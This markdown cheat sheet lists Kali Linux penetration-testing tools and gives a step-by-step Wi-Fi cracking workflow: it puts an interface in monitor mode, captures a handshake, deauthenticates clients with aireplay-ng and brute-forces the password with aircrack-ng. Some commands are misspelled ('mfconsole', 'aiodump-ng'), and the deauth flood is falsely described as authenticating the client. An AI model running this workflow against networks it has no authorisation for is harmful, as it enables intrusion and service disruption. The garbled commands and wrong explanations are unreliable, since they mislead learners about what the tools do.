---
title: Kali-linux commands
description: Kali Linux is a Debian-derived Linux distribution that is maintained by Offensive Security.
created: 2022-10-11
updated: 2018-10-11
---

# Kali Linux 

Kali Linux is a Debian-derived Linux distribution that is maintained by Offensive Security. It is for those who work under the umbrella of cybersecurity and analysis.

## Kali Linux tools for hacking and penetration testing 

### 1. Pinging the host 
```sh
$ ping hostname               # Used for pinging the host
```

### 2. Nmap 
```sh
$ nmap -sV ipaddress          # Used for recon/scan the networks
```

### 3. Burpsuite
```sh
$ burpsuite                   # Used for 'burpsuite' security testing software
```

### 4. Metasploit framework 
```sh
$ mfconsole                 # Opens a penetration testing framework 'Metasploit'
```

### 5. Aircrack
```sh
$ aircrack-ng               # Opens a wi-fi hacking 'Aircrack' tool
```

### 6. John the riper 
```sh
$ john                      # Opens a password cracking tool
```

### 7. Sqlmap
```sh
$ sqlmap                    # It is widely used in sql injection attacks
```

### 8. Autopsy
```sh
$ autopsy                   # Opens a digital foensic tool
```

### 9. Social Engineering Toolkit
```sh
$ setoolkit                # Used in social engineering attacks
```

## Kali linux tools for Wi-fi hacking

### 1. List all the networks
```sh
$ airmon-ng             # Lists all the available network interfaces
```

### 2. Monitor the designed network interface
```sh
$ airmon-ng start wlan0 1      # Used for monitoring network interafce
```
- **wlan0** : Desired wi-fi network

### 3. Capture the network interface network
```sh
$ aiodump-ng wlan0mon       # Used for capturing the traffic
```
- **wlan0mon** : Desired wi-fi network

### 4. Capture required data from specific network
```sh
$ airodump-ng --bssid 09:98:98:98:98:98 -c 1 --write psk wlan0mon
# Capturing the data from network
```
- **09:98:98:98:98:98** : bssid of network
- **-c 1** : channel number
- **psk** : the file in which captured data is stored
- **wlan0mon** : Desired wi-fi network

### 5. Authorization of client 
```sh
$ aireplay-ng --deauth 100 -a 09:98:98:98:98:98 wlan0mon
# Used for authenticatng the client
```
- **09:98:98:98:98:98** : bssid of network
- **wlan0mon** : Desired wi-fi network

### 6. Stop Wi-fi interface monitoring 
```sh
$ airmon-ng stop wlan0mon     # Sets the wi-fi interface back to its default stage
``` 
- **wlan0mon** : Desired wi-fi network

### 7. Cracking password 
```sh
$ aircrack-ng -w wordlist psk*.cap  # Gets the password by brute force attack
```
- **psk*.cap* : captured handshake file
- **wordlist** : password to be tested 
